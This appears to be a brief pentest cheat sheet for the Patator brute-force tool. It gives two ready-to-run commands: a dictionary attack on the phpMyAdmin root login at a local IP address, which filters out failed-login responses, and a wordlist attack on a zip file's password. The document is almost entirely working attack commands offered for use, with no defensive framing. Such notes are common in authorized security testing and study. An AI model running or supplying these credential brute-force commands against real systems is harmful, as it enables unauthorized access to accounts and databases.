# Patator

## Web Cracking
```shell
# Crack phpMyAdmin password for default user
patator http_fuzz url=http://192.168.1.9/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&' 0=/usr/share/ncrack/phpbb.pwd follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
```

## Zip Cracking
```shell
patator unzip_pass zipfile=./test.zip password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:code!=0
```